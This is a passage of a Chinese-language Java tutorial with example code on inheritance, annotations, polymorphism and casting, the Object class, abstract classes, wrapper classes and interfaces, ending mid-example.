2、当子类继承了父类后实际上是可以进行父类中方法覆写的，但是不想被覆写可以使用final来定义。（底层设计相关可能常用）\n​    3、用来定义常量（不可修改的值）\n​        全局常量一般使用public static final int ON = 1定义，ON就是常量，常量必须全部大写。\n\n总结二案例一​    建立一个人类（Person）和学生类（Student）：\n​    1、Person中包含4个私有型的数据成员name、addr、sex、age，分别为字符串型、字符串型、字符型及整形，表示姓名、地址、性别和年龄。一个4参构造方法、一个两参构造方法、一个无参构造方法、一个输出方法、一个输出方法显示4种属性。\n​    2、Student类继承Person类，并增加math、english存放数学和英语成绩。一个6参构造方法、一个两参构造方法、一个无参数构造方法和重写输出方法用于显示6种属性。\nclass Person3 &#123;    private String name;    private String addr;    private char sex;    private int age;    public Person3() &#123;    &#125;    public Person3(String name, String addr) &#123;        this(name, addr, &#x27;男&#x27;, 0);    &#125;    public Person3(String name, String addr, char sex, int age) &#123;        this.name = name;        this.addr = addr;        this.sex = sex;        this.age = age;    &#125;    public String getInfo() &#123;        return &quot;姓名：&quot; + this.name + &quot;、地址：&quot; + this.addr + &quot;、性别：&quot; + sex + &quot;、年龄：&quot; + age;    &#125;&#125;class Student4 extends Person3 &#123;    private double math;    private double english;    public Student4(String name, String addr) &#123;        super(name, addr);    &#125;    public Student4(String name, String addr, char sex, int age, double math, double english) &#123;        super(name, addr, sex, age);        this.math = math;        this.english = english;    &#125;    public String getInfo() &#123;        return super.getInfo() + &quot;、数学成绩：&quot; + this.math + &quot;、英语成绩：&quot; + this.english;    &#125;&#125;public class Test12 &#123;    public static void main(String[] args) &#123;        Student4 student4 = new Student4(&quot;张三&quot;,&quot;天安门&quot;,&#x27;男&#x27;,12,78.99,89.98);        System.out.println(student4.getInfo());    &#125;&#125;\n\n案例二​    编写程序，统计出字符串“want you to know one thing”中字母n和字母o的出现次数。\nclass StringUtil1 &#123;    //返回第一个为n的个数，第二个为字母o的个数    public static int[] count(String str) &#123;        int countData[] = new int[2];        char[] data = str.toCharArray();//将字符串变为字符数组        for (int x = 0; x &lt; data.length; x++) &#123;            if (data[x] == &#x27;n&#x27; || data[x] == &#x27;N&#x27;) &#123;                countData[0]++;            &#125;            if (data[x] == &#x27;o&#x27; || data[x] == &#x27;O&#x27;) &#123;                countData[1]++;            &#125;        &#125;        return countData;    &#125;&#125;public class Test13 &#123;    public static void main(String[] args) &#123;        String str = &quot;want you to know one thing&quot;;        int result[] = StringUtil1.count(str);        System.out.println(&quot;字母n的个数：&quot; + result[0]);        System.out.println(&quot;字母o的个数：&quot; + result[1]);    &#125;&#125;\n\n​    以上的解决方案严格来讲只是一种顺序式的思维模式解决的，假设说现在统计的事字母o和字母n的个数，那么还有可能进行其他的字符统计。\npackage two;class StringUtil3&#123;    private String content;//需要保存字符串    public StringUtil3(String content)&#123;        this.content = content;    &#125;    public String getContent()&#123;        return this.content;    &#125;    public String getInfo()&#123; //默认的信息返回        return this.getContent();    &#125;&#125;class StringCount extends StringUtil3&#123;    private int nCount;    private int oCount;    public StringCount(String content)&#123;        super(content);        this.countChar();//构造方法统计    &#125;    public void countChar()&#123;        char[] data = super.getContent().toCharArray();//将字符串变为字符数组        for (int x = 0; x &lt; data.length; x++) &#123;            if (data[x] == &#x27;n&#x27; || data[x] == &#x27;N&#x27;) &#123;                this.nCount++;            &#125;            if (data[x] == &#x27;o&#x27; || data[x] == &#x27;O&#x27;) &#123;                this.oCount++;            &#125;        &#125;    &#125;    public int getNCount()&#123;        return this.nCount;    &#125;    public int getOCount()&#123;        return this.oCount;    &#125;    public String getInfo()&#123;        return &quot;字母n的个数：&quot;+this.nCount+&quot;、字母o的个数：&quot;+this.oCount;    &#125;&#125;public class Test14 &#123;    public static void main(String[] args) &#123;        StringCount sc = new StringCount(&quot;want you to know one thing&quot;);        System.out.println(sc.getInfo());    &#125;&#125;\n\n\nAnnotation注解类Annotation简介​    JDK1.5之后，利用Annotation可以有效减少程序配置的代码，并且使用其进行一些结构化定义。Annotation是以一种注解的形式实现的程序开发。\n​    \n​    代码开发经历过三个阶段：\n​    1、在程序定义的时候将所有可能使用到的资源全部定义在程序代码之中：\n​        如果此时服务器地址改变，程序就要改，极不方便。\n​    2、引入配置文件，在配置文件之中定义程序需要的服务器资源\n​        配置文件不多情况，好用，但是多的时候配置文件特别多。并且所有的文件都要通过配置文件完成，开发难度提升。\n​    3、将配置信息重新写回程序，利用一些特殊的标记与程序代码进行分离。\n​        现在基本是配置文件+注解。\n​    重点讲以下几个注解：@override、@Deprecated、@SuppressWarnings\n准确覆写@override​    当子类继承某一个父类之后如果发现父类中的某些方法功能不足的时候往往会采用覆写的形式来扩充。\n​    开发中会有两个经常的问题：1、忘记写extend。2、覆写时单词写错了。并且这两个错都不会报错。现在追加注解IDEA自动做了。\n过期声明(操作)：@Deprecated​    指的是在软件项目迭代开发中，可能有某个类有所不周，导致新版本有不适应的地方，这个时候不能直接删除这些操作，那么就希望有过度时间。可以采用@Deprecated注解。\n压制警告：@SuppressWarings​    以之前的过期声明为例，可以发现程序在进行编译的时候会出现一个错误的提示信息：使用的过期的API。如果此时不愿意见到这个信息，可以进行压制警告信息。做的只是让警告信息不出现。\n\n多态性多态性简介​    多态性是面向对象中的第三大主要特征，多态性是在继承性的基础之上扩展出来的概念，也就是说可以实现父子类之间的相互转换处理。\n​    在Java之中对于多态性有两种实现的模式：\n​    1、方法的多态性：\n​        方法的重载：同一个方法名称可以根据传入的参数的类型或个数的不同实现不同功能的执行。\n​        方法的覆写：同一个方法可能根据使用子类的不同有不同的实现。\n​    2、对象的多态性：\n​        父子实例之间的转换处理，它有两种模式：\n​        1&gt;对象向上转型：父类 父类实例 = 子类实例、自动完成转换；\n​        2&gt;对象向下转型：子类 子类实例 = (子类)父类实例、强制完成转换。\n​    在实际的转型处理来讲，大部分情况下考虑最多的一定是对象的向上转型、对象的向下转型是在特殊功能（子类可以对父类进行功能扩充）的时候，还有一些时候是不会考虑转型的（String类）。\n对象向上转型​    对象转型的处理属于多态性，而这一特性必须在继承性的基础上实现。\nclass Message&#123;    public void print()&#123;        System.out.println(&quot;mes9s0&quot;);    &#125;&#125;class DataBaseMessage extends Message&#123;    public void print()&#123;        System.out.println(&quot;mes9s0数据库链接信息&quot;);    &#125;&#125;public class Test15 &#123;    public static void main(String[] args) &#123;        DataBaseMessage msg = new DataBaseMessage();        msg.print();    &#125;&#125;\n\n​    本程序是一个最简单的方法覆写操作实现，整体的程序之中可以发现，由于现在实例化的是子类对象，并且子类对象覆写了父类中的print方法，所以调用的是覆写的方法。\nclass Message&#123;    public void print()&#123;        System.out.println(&quot;mes9s0&quot;);    &#125;&#125;class DataBaseMessage extends Message&#123;    public void print()&#123;        System.out.println(&quot;mes9s0数据库链接信息&quot;);    &#125;&#125;class WebServerMessage extends Message&#123;    public void print()&#123;        System.out.println(&quot;mes9s0web服务器信息&quot;);    &#125;&#125;public class Test15 &#123;    public static void main(String[] args) &#123;        fun(new DataBaseMessage());      //Message msg = new DataBaseMessage()        fun(new WebServerMessage());      // Message msg = new WebServerMessage()    &#125;    public static void fun(Message msg)&#123;      //不管传递的是哪个子类，都可以用一个参数接收        msg.print();    &#125;&#125;\n\n​    向上转型的主要特点在于，可以对参数进行统一的设计。为什么不用重载来实现，因为除了对程序类设计的时候，除了对当前的要求之外，还需要做出可以维护性的设计，如果说现在随着项目的发展，产生了很多很多的子类，每次添加之后都需要对message之后追加一个fun()的方法重载，这样就对程序的维护有很大影响。\n​    向上转型实现的就是接受参数的统一性。\n对象向下转型​    向下转型主要特点在于需要使用到一些子类自己特殊的定义处理。\nclass Person6&#123;    public void print()&#123;        System.out.println(&quot;一个人的正常的人类行为，吃饭，睡觉&quot;);    &#125;&#125;class SuperMan extends Person6&#123;    public String fly()&#123;        return &quot;我可以飞&quot;;    &#125;    public String fire()&#123;        return &quot;我可以喷火&quot;;    &#125;&#125;public class Test16 &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;----------正常状态下的超人是一个普通人&quot;);        Person6 person6 = new SuperMan();//向上转型        person6.print();        System.out.println(&quot;----------外星人进攻地球&quot;);        SuperMan man = (SuperMan) person6;//向下转型        System.out.println(man.fly());        System.out.println(man.fire());    &#125;&#125;\n\n​    向上描述的是一些公共的特征，而向下描述的是子类自己特殊的定义环境，但是需要明确的是，向下转型不是一个安全的事情。因为在向下转型之前一定要发生向上转型。\nInstanceof关键字​    通过分析可以发现向下转型本身是一件存在有安全隐患的操作，所以为了保证向下转型的正确性，我们往往在进行转型前，需要判断某个实例是否是某个类的对象，这个就需要通过instanceof语法\n​    instanceof判断将返回一个boolean类型，如果是true表示实例是指定类对象。\nclass Person7&#123;    public void print()&#123;        System.out.println(&quot;一个人的正常的人类行为，吃饭，睡觉&quot;);    &#125;&#125;class SuperMan1 extends Person7&#123;    public String fly()&#123;        return &quot;我可以飞&quot;;    &#125;    public String fire()&#123;        return &quot;我可以喷火&quot;;    &#125;&#125;public class Test17 &#123;    public static void main(String[] args) &#123;        Person7 per = new Person7(); //不转型        System.out.println(per instanceof Person7);//true        System.out.println(per instanceof SuperMan1);//false    &#125;&#125;\n\nclass Person7&#123;    public void print()&#123;        System.out.println(&quot;一个人的正常的人类行为，吃饭，睡觉&quot;);    &#125;&#125;class SuperMan1 extends Person7&#123;    public String fly()&#123;        return &quot;我可以飞&quot;;    &#125;    public String fire()&#123;        return &quot;我可以喷火&quot;;    &#125;&#125;public class Test17 &#123;    public static void main(String[] args) &#123;        Person7 per = new SuperMan1(); //不转型        System.out.println(per instanceof Person7);//true        System.out.println(per instanceof SuperMan1);//true    &#125;&#125;\n\n​    开发过程中，对于转型之前最好用instanceof进行判断。\n\nObject类Object类的基本概念​    Object类的主要特点是可以解决参数的统一问题，也就是说使用object类可以接受所有的数据类型。\n​    在java中，只有一个类不存在继承关系，就是object类。所有的类都是object类的子类。比如说：class test{}和class test extends object{}是同一个类。\n​    在object类设计的时候考虑到所有的继承的问题，所以该类提供有无参构造方法，这样所有的类在定义时即便不知道也不会出现调用错误的情况。\n​    既然object类是所有类的父类，那么我们可以使用object类接收所有的子类对象\nclass Person8&#123;&#125;public class Test18 &#123;    public static void main(String[] args) &#123;        Object obj = new Person8();//向上转型        if (obj instanceof Person8)&#123;            Person8 per = (Person8) obj;            System.out.println(&quot;Person对象向下转型完毕&quot;);        &#125;    &#125;&#125;\n\n​    如果一个程序的方法要求可以接收所有类对象的时候就可以利用object来实现。需要注意的是，在java设计过程之中，对于所有的引用数据类型实际上都可以用object进行接收，包括数组也可以。\nclass Person8 &#123;&#125;public class Test18 &#123;    public static void main(String[] args) &#123;        Object obj = new int[]&#123;1, 2, 3&#125;;//向上转型        if (obj instanceof int[]) &#123;            int data[] = (int[]) obj;            for (int temp : data) &#123;                System.out.println(temp + &quot;、&quot;);            &#125;        &#125;    &#125;&#125;\n\n获取对象信息​    object虽然是一个类，但是这个类本身也是提供一些处理方法的，在object类之中提供有tostring方法，可以获得一个对象的完整信息。\nclass Person9 &#123;&#125;public class Test19 &#123;    public static void main(String[] args) &#123;        Person9 per = new Person9();        System.out.println(per);        System.out.println(per.toString());//object类继承而来    &#125;&#125;\n\n    \n​    可以发现在之前进行对象直接输出的时候所调用的方法就是toString方法，所以这个方法调用不调用是一样的。所以以后对象信息的获取可以覆写此方法。\n对象比较​    object类之中另外一个比较重要的方法就是在于对象比较的处理上，所谓的对象比较主要的功能是比较两个对象的内容是否相同。\n​    最基础的对象比较实现方法，此时确实实现了对象比较，但非常麻烦。由于需要进行属性比较的时候都要进行一个相等的判断，所以要大量的get方法：\nclass Person9 &#123;    private String name;    private int age;    public Person9(String name,int age)&#123;        this.name = name;        this.age = age;    &#125;    public String toString()&#123;        return &quot;姓名：&quot;+this.name+&quot;、年龄：&quot;+this.age;    &#125;    public String getName()&#123;        return this.name;    &#125;    public int getAge()&#123;        return this.age;    &#125;&#125;public class Test19 &#123;    public static void main(String[] args) &#123;        Person9 perA = new Person9(&quot;张三&quot;,20);        Person9 perB = new Person9(&quot;张三&quot;,20);        if (perA.getName().equals(perB.getName()) &amp;&amp; perA.getAge() == perB.getAge())&#123;            System.out.println(&quot;是同一个对象&quot;);        &#125;else &#123;            System.out.println(&quot;不是同一个对象&quot;);        &#125;    &#125;&#125;\n\n​    对象比较应该是一个类内部所具备的功能，而不是外部，object类提供了对象比较操作的支持，对于对象比较的操作实现可以使用equals()方法完成,默认情况下下只是完成了两个对象的地址判断：    \npublic boolean equals(Object obj)&#123;\treturn(this == obj);&#125;\n\n​    也就是对于使用来说，需要覆写：\npackage two;//tostringclass Person9 &#123;    private String name;    private int age;    public Person9(String name,int age)&#123;        this.name = name;        this.age = age;    &#125;    public String toString()&#123;        return &quot;姓名：&quot;+this.name+&quot;、年龄：&quot;+this.age;    &#125;    public boolean equals(Object obj)&#123;        if (!(obj instanceof Person9))&#123;            return false;        &#125;        if (obj == null)&#123;            return false;        &#125;        if (this == obj)&#123;            return true;        &#125;        Person9 per = (Person9) obj;//为了获取类中的属性        return this.name.equals(per.name) &amp;&amp; this.age == per.age;    &#125;&#125;public class Test19 &#123;    public static void main(String[] args) &#123;        Person9 perA = new Person9(&quot;张三&quot;,20);        Person9 perB = new Person9(&quot;张三&quot;,20);        System.out.println(perA.equals(&quot;狗&quot;));//返回false    &#125;&#125;\n\n​    String类作为objectd的子类，这个类里面已经覆写了equals方法。\n\n抽象类的定义与使用​    类继承的主要作用在于扩充已有类的功能，但是对于之前的继承操作而言会发现，子类可以由自己的选择任意来决定是否要覆写某一个方法，这个时候父类无法对子类作出强制性约定（强制性必须覆写某一个方法），这种情况下很少用继承（在实际开发中很少会出现继承一个已经完善的类，完善的类指的是可以直接使用的类）而是必须继承抽象类，在以后进行父类设计的时候优先考虑的一定是抽象类。\n抽象类基本概念​    抽象类的主要作用是对子类中覆写方法进行约定，在抽象类里面可以去定义一些抽象方法以实现这样的约定。抽象方法指的是使用了abstract关键字定义的并且没有提供方法体的方法，而抽象方法所以的类必须是抽象类，必须用abstract关键字进行定义（在普通类的基础上追加抽象方法就是抽象类）。\n​    当一个抽象类定义完成之后（切记：“抽象类不是完整的类”），如果要去使用抽象类，必须要一下几点。\n​    1、抽象类必须提供子类，子类使用extends继承一个抽象类。\n​    2、抽象类的子类（不是抽象类）一定要覆写抽象类中的全部抽象方法。\n​    3、抽象类的对象实例化可以利用对象多态性通过子类向上转型的方式完成。\nabstract class Message1 &#123;    private String type;//消息类型    public abstract String getConnectInfo();//抽象方法    public void setType(String type) &#123;//普通方法        this.type = type;    &#125;    public String getType()&#123;//普通方法        return this.type;    &#125;&#125;class DatabaseMessage1 extends Message1&#123;    @Override    public String getConnectInfo() &#123;//方法覆写        return &quot;Oracle数据库链接信息&quot;;    &#125;&#125;public class Test20 &#123;    public static void main(String[] args) &#123;        Message1 msg = new DatabaseMessage1();        msg.setType(&quot;客户消息&quot;);        System.out.println(msg.getConnectInfo());        System.out.println(msg.getType());    &#125;&#125;\n\n​    从整体上讲，抽象类只是比普通方法增加了强制性的覆写要求而已，其他的使用过程和传统的类继承完全相同。\n​    对于抽象类使用的意见：\n​    1、抽象类使用很大程度上有一个核心的问题：抽象类自己无法直接实例化；\n​    2、抽象类之中主要的目的是进行过度操作使用，所以当你要使用抽象类进行开发的时候，往往都是在你设计中需要解决类继承问题时所带来的代码重复处理。\n抽象类的相关说明​    抽象类是一个重要的面相对象设计的结构，对于抽象类的使用需要注意以下几点问题：\n​    1、在定义抽象类的时候绝对不能够使用final关键字来进行定义，因为抽象类必须有子类，而final定义不能有子类。\n​    2、抽象类是作为一个普通类的加强版出现的（抽象类的组成就是在普通类的基础上扩展而来的，只是追加了抽象方法），既然是在普通类的基础桑上扩展的，那么普通类之中就可以定义属性和方法，那么这些属性一定是要求进行内存空间开辟的，所以抽象类一定可以提供有构造方法，并且子类也一定会按照子类对象的实例化原则进行构造调用。\nabstract class Message1 &#123;    private String type;//消息类型    public Message1(String type)&#123;//类中没有提供无参构造        this.type = type;    &#125;    public abstract String getConnectInfo();//抽象方法    public void setType(String type) &#123;//普通方法        this.type = type;    &#125;    public String getType()&#123;//普通方法        return this.type;    &#125;&#125;class DatabaseMessage1 extends Message1&#123;    public DatabaseMessage1(String str)&#123;        super(str);    &#125;    @Override    public String getConnectInfo() &#123;//方法覆写        return &quot;Oracle数据库链接信息&quot;;    &#125;&#125;public class Test20 &#123;    public static void main(String[] args) &#123;        Message1 msg = new DatabaseMessage1(&quot;客户消息&quot;);        System.out.println(msg.getConnectInfo());        System.out.println(msg.getType());    &#125;&#125;\n\n​    3、抽象类中允许没有抽象方法，但是即便没有抽象方法，也无法直接使用关键字new直接实例化抽象对象。\n​    4、抽象类中可以提供有static方法，并且该方法不受到抽象类对象的局限。\nabstract class Message2 &#123;    public abstract String getInfo();    public static Message2 getInstance()&#123;        return new DatabaseMessage2();    &#125;&#125;class DatabaseMessage2 extends Message2&#123;    public String getInfo()&#123;        return &quot;数据库链接信息。&quot;;    &#125;&#125;public class Test21 &#123;    public static void main(String[] args) &#123;        Message2 msg = Message2.getInstance();        System.out.println(msg.getInfo());    &#125;&#125;\n\n​    static方法永远不受到实例化对象或结构的限制，永远可以直接通过类名称进行调用。\n模版设计模式​    抽象类的本质上就属于一个加强型的类，那么对于类已经清楚了，可以描述一切的有关的现实事务，我们也可以发现，抽象类的设计应该是比类更高一层的定义。下面看一下抽象类的实际应用。\n​    注意，抽象类应该是针对行为进行定义。\n​    假如要描述三类事物：1、机器人：不休息，只知道补充能量和工作；2、人类：需要休息、需要吃饭以及努力的工作；3、猪：需要休息、不需要工作只需要吃饭。\n\nabstract class Action &#123;    public static final int EAT = 1;    public static final int SLEEP = 5;    public static final int WORK = 10;    public void command(int code) &#123;        switch (code) &#123;            case EAT: &#123;                this.eat();                break;            &#125;            case SLEEP: &#123;                this.sleep();                break;            &#125;            case WORK: &#123;                this.work();                break;            &#125;            case EAT + SLEEP + WORK: &#123;                this.eat();                this.sleep();                this.work();                break;            &#125;        &#125;    &#125;    public abstract void eat();    public abstract void sleep();    public abstract void work();&#125;class Robot extends Action &#123;    @Override    public void eat() &#123;        System.out.println(&quot;机器人需要电源接通充电&quot;);    &#125;    @Override    public void sleep() &#123;    &#125;    @Override    public void work() &#123;        System.out.println(&quot;机器人按固定套路工作&quot;);    &#125;&#125;class Person10 extends Action &#123;    @Override    public void eat() &#123;        System.out.println(&quot;饿的时候安静的坐下吃饭&quot;);    &#125;    @Override    public void sleep() &#123;        System.out.println(&quot;安静的躺下慢慢地睡觉&quot;);    &#125;    @Override    public void work() &#123;        System.out.println(&quot;有想法的工作&quot;);    &#125;&#125;class Pig extends Action &#123;    @Override    public void eat() &#123;        System.out.println(&quot;吃食槽剩饭&quot;);    &#125;    @Override    public void sleep() &#123;        System.out.println(&quot;倒地就睡&quot;);    &#125;    @Override    public void work() &#123;    &#125;&#125;public class Test22 &#123;    public static void main(String[] args) &#123;        Action robotAction = new Robot();        Action personAction = new Person10();        Action pigAction = new Pig();        System.out.println(&quot;--------机器人行为--------&quot;);        robotAction.command(Action.SLEEP);        robotAction.command(Action.WORK);        System.out.println(&quot;--------人类行为----------&quot;);        personAction.command(Action.SLEEP+Action.EAT+ Action.WORK);        System.out.println(&quot;--------猪类行为----------&quot;);        pigAction.command(Action.WORK);        personAction.command(Action.EAT);    &#125;&#125;\n\n​    现在的程序已经完整的实现了一个行为的抽象处理，但是也需要作出一点点思考。现在定义的Action父类主要的目的是对所有行为规范进行统一处理。\n​    抽象类最大的好吃一是对子类方法的统一管理，二是可以自身提供有一些普通方法并且这些普通方法可以调用抽象方法（抽象方法在有子类提供实现的时候）。\n\n包装类​    包装类的主要功能是针对于基本数据类型的对象转换而实现的，并且随着JDK版本的更新，包装类的功能也在改变有着更多的支持。\n包装类实现原理分析​    Object类最大的特点是所有类的父类，并且可以接收所有的数据类型，但是在这个过程之中就存在问题：基本数据类型并不是一个类，所以现在如果想要将基本数据类型以类的形式进行处理，那么就需要对其进行包装。\n​    以int数据为例实现一个包装处理的定义：\nclass Int &#123;    private int data;//包装了一个基本数据类型    public Int(int data) &#123;        this.data = data;    &#125;    public int intValue() &#123;        return this.data;    &#125;&#125;public class Test23 &#123;    public static void main(String[] args) &#123;        //装箱：将基本数据类型保存在包装类之中        Object obj = new Int(10);        //拆箱：从包装类对象中获取基本数据类型        int x = ((Int)obj).intValue();        System.out.println(x * 2);//20    &#125;&#125;\n\n​    基本数据类型进行包装处理后可以像对象一样进行引用传递，同时也可以使用Object类来进行接收，但是如果我们都已经可以发现基本数据类型与Objec类型之间的缺陷，那么JDK早就发现了同样的问题，所以就有了包装类的概念。\n​    基本数据类型一共有八种，所以包装类一共有八种。\n\n​    可以发现在java中包装类一共提供两种类型：\n​    1、对象型包装类(Object直接子类):Boolean、Character；\n​    2、数值型的包装类(Number直接子类):Byte、Short、Integer、Long、Float、Double;\n​    Number是一个抽象类，要是看见了Number都应该明确的表示它是一个数字的概念，这个类定义有如下方法：\n\n\n\nNo.\n方法名称\n类型\n描述\n\n\n\n01\npublic byte byteValue()\n普通\n从包装类中获取byte数据\n\n\n02\npublic short shortValue()\n普通\n从包装类中获取short数据\n\n\n03\npublic abstract int intValue()\n普通\n从包装类中获取int数据\n\n\n04\npublic abstract long longValue()\n普通\n从包装类中获取long数据\n\n\n05\npublic abstract float floatValue()\n普通\n从包装类中获取float数据\n\n\n06\npublic abstract double doubleValue()\n普通\n从包装类中获取double数据\n\n\n​    Number类中的方法就是直接提供有获取包装类中基本数据类型的功能，一共只有六个方法。\n装箱与拆箱​    基本数据类型的包装类都是为了基本数据类型转为对象提供的，这样对于基本类型与包装类之间就有了如下关系。\n​    1、数据装箱：将基本数据类型保存到包装类之中，一般可以利用构造方法完成。\n​    -Integer类：public Integer(int value);\n​    -Double类：public Double(double value);\n​    -Boolean类：public Boolean(boolean value);\n​    //以上在JDK1.9废除\n​    2、数据拆箱：从包装类中获取基本数据类型：\n​    -数值型包装类已经由Number类定义了拆箱的方法了\n​    -Boolean型：public boolean booleanValue();\n范例：\n​    1、以int和Integer为例\npublic class Test24 &#123;    public static void main(String[] args) &#123;        Integer obj = new Integer(10);//装箱        int num = obj.intValue();//拆箱        System.out.println(num*num);    &#125;&#125;\n\n​    2、以double与Double为例\npublic class Test24 &#123;    public static void main(String[] args) &#123;        Double obj = new Double(10.1);//装箱        double num = obj.doubleValue();//拆箱        System.out.println(num*num);    &#125;&#125;\n\n​    3、以boolean和Boolean为例\npublic class Test24 &#123;    public static void main(String[] args) &#123;        Boolean obj = new Boolean(true);//装箱        boolean num = obj.booleanValue();//拆箱        System.out.println(num);    &#125;&#125;\n\n​    可以发现从1.9之后，对于所有包装类之中提供的构造方法就变为了过期处理，不建议用户再继续使用了，这是因为从JDK1.5之后为了方便处理提供了自动的装箱与拆箱操作，所以这种手工的操作被废除了。\n​    自动装箱与拆箱：\npublic class Test24 &#123;    public static void main(String[] args) &#123;        Integer obj = 10;//自动装箱，此时不再关心构造方法        int num = obj;//自动拆箱        obj++;//包装类对象可以直接参与数学运算        System.out.println(num*obj);    &#125;&#125;\n\n​    除了提供了自动的数学运算支持之外，使用自动装箱最大的好处是可以实现Object接收基本数据类型的操作。\n​    Object接收小数：\n​    这是一个错误的程序：\npublic class Test24 &#123;    public static void main(String[] args) &#123;        Object obj = 19.2;//double自动装箱为Double，向上转型为Object        obj++;    &#125;&#125;\n\n\npublic class Test24 &#123;    public static void main(String[] args) &#123;        Object obj = 19.2;//double自动装箱为Double，向上转型为Object        double num = (Double)obj;//向下转型为包装类，再自动拆箱        System.out.println(num*num);    &#125;&#125;\n\n​    对于包装类需要注意的问题，关于相等判断上：\npublic class Test24 &#123;    public static void main(String[] args) &#123;        Object obj = 19.2;//double自动装箱为Double，向上转型为Object        double num = (Double) obj;//向下转型为包装类，再自动拆箱        System.out.println(num * num);        Integer x = 99;        Integer y = 99;        System.out.println(x == y);//true        Integer c = 128;        Integer d = 128;        System.out.println(c == d);//false    &#125;&#125;\n\n​    以后进行包装类相等判断的时候一定要用equals()完成，而包装类本身也需要考虑占位的长度，如果超过了一位，那么就需要使用equals()比较，不超过的话==也可。\n\n接口的定义与使用接口基本定义​    抽象类与普通类相比最大的优势在于：可以实现对子类覆写方法的控制，但是在抽象类里面可能依然会保留有一些普通方法，而普通方法里面可能会涉及到一些安全或者隐私的问题，那么这样的话在开发中，如果要对外部隐藏全部的实现细节，则就可以通过接口来进行描述。\n​    接口可以理解为一个纯粹的抽象类（最原始的定义接口之中是只包含有抽象方法与全局常量的），但是从JDK1.8开始，由于引入Lambda表达式的概念，所以接口的定义也得到了加强，除了抽象方法与全局常量之外，还可以定义普通方法或静态方法。如果从设计本身的角度来讲，接口之中的组成还是应该以抽象方法和全局常量为主。\n​    在Java中接口主要使用interface关键字来进行定义。\n//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个Iinterface IMessage&#123;    public static final String INFO = &quot;mes9s0&quot;;//全局常量    public abstract String getInfo();//抽象方法&#125;\n\n​    此时的接口肯定无法直接产生实例化对象，所以对于接口的使用原则如下：\n​    1、接口需要被子类实现（implements），一个子类可以实现多个父接口；\n​    2、子类（如果不是抽象类）那么一定要覆写接口之中的全部抽象方法；\n​    3、接口对象可以利用子类对象的向上转型进行实例化；\n//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个Iinterface IMessage&#123;    public static final String INFO = &quot;mes9s0&quot;;//全局常量    public abstract String getInfo();//抽象方法&#125;class MessageImpl implements IMessage&#123;    @Override    public String getInfo() &#123;        return &quot;得到一个秘密的消息&quot;;    &#125;&#125;public class Test25 &#123;    public static void main(String[] args) &#123;        IMessage msg = new MessageImpl();        System.out.println(msg.getInfo());        System.out.println(IMessage.INFO);    &#125;&#125;\n\n​    Java里使用接口主要的目的是一个子类可以实现多个接口，接口可以实现多继承的概念。\n//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个Iinterface IMessage&#123;    public static final String INFO = &quot;mes9s0&quot;;//全局常量    public abstract String getInfo();//抽象方法&#125;interface IChannel&#123;    public abstract boolean connect();//定义抽象方法&#125;class MessageImpl implements IMessage,IChannel&#123;    @Override    public String getInfo() &#123;        if (this.connect())&#123;            return &quot;得到一个秘密的消息&quot;;        &#125;        return &quot;通道创建失败&quot;;    &#125;    @Override    public boolean connect()&#123;        System.out.println(&quot;消息发送通道已经建立&quot;);        return true;    &#125;&#125;public class Test25 &#123;    public static void main(String[] args) &#123;        IMessage msg = new MessageImpl();        System.out.println(msg.getInfo());        System.out.println(IMessage.INFO);    &#125;&#125;\n\n​    但是这个时候就需要考虑一个实际的情况了，关于对象的转型问题了。\n\n​    此时MessageImpl子类的对象可以任意的实现父接口的转换。\n//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个Iinterface IMessage&#123;    public static final String INFO = &quot;mes9s0&quot;;//全局常量    public abstract String getInfo();//抽象方法&#125;interface IChannel&#123;    public abstract boolean connect();//定义抽象方法&#125;class MessageImpl implements IMessage,IChannel&#123;    @Override    public String getInfo() &#123;        if (this.connect())&#123;            return &quot;得到一个秘密的消息&quot;;        &#125;        return &quot;通道创建失败&quot;;    &#125;    @Override    public boolean connect()&#123;        System.out.println(&quot;消息发送通道已经建立&quot;);        return true;    &#125;&#125;public class Test25 &#123;    public static void main(String[] args) &#123;        IMessage msg = new MessageImpl();        IChannel chl = (IChannel) msg;//此时可以正常转型！        System.out.println(chl.connect());    &#125;&#125;\n\n​    由于MessageImpl子类实现了IMessage与Channel两个接口，所以这个子类可以是这两个接口任意一个接口的实例，那么就表示此时这两个接口是可以相互转换的，但仅限于通过MessageImpl获取生成的实例。\n​    在java里接口是绝对不允许去继承父类的，所以接口绝对不会是Object的子类，但是根据之前的分析可以发现，MessageImpl是Object的子类，所以接口一定可以通过Object接收。\n​    观察Object于接口转换：\n//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个Iinterface IMessage&#123;    public static final String INFO = &quot;mes9s0&quot;;//全局常量    public abstract String getInfo();//抽象方法&#125;interface IChannel&#123;    public abstract boolean connect();//定义抽象方法&#125;class MessageImpl implements IMessage,IChannel&#123;    @Override    public String getInfo() &#123;        if (this.connect())&#123;            return &quot;得到一个秘密的消息&quot;;        &#125;        return &quot;通道创建失败&quot;;    &#125;    @Override    public boolean connect()&#123;        System.out.println(&quot;消息发送通道已经建立&quot;);        return true;    &#125;&#125;public class Test25 &#123;    public static void main(String[] args) &#123;        IMessage msg = new MessageImpl();        Object obj = msg;//向上转型        IChannel chan = (IChannel) obj;        System.out.println(chan.connect());    &#125;&#125;\n\n​    Object类对象可以接收所有数据类型，包括基本数据类型、类对象、接口对象、数组。\n​    由于接口描述的是一个公共的定义标准，所以在接口之中所有的抽象方法的访问权限都是public，也就是说写与不写public都是一样的。默认都是public，所以在覆写的时候只能用public。\n​    接口虽然已经成功的进行了定义，但是不要忽略在实际的开发过程中，实现接口的有可能是抽象类。一个抽象类可以实现多个接口，而一个普通类只能够继承一个抽象类并且可以实现多个接口，但是要求先继承后实现。\n子类继承抽象类：\n//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个Iinterface IMessage&#123;    public static final String INFO = &quot;mes9s0&quot;;//全局常量    public abstract String getInfo();//抽象方法&#125;interface IChannel&#123;    public abstract boolean connect();//定义抽象方法&#125;abstract class DatabaseAbstractImpl&#123;    //接口中才能省略，抽象类不能省略    public abstract boolean getDatabaseConnection();&#125;class MessageImpl extends DatabaseAbstractImpl implements IMessage,IChannel&#123;    @Override    public String getInfo() &#123;        if (this.connect())&#123;            if (this.getDatabaseConnection()) &#123;                return &quot;数据库得到一个秘密的消息&quot;;            &#125;else &#123;                return &quot;数据库消息无法访问&quot;;            &#125;        &#125;        return 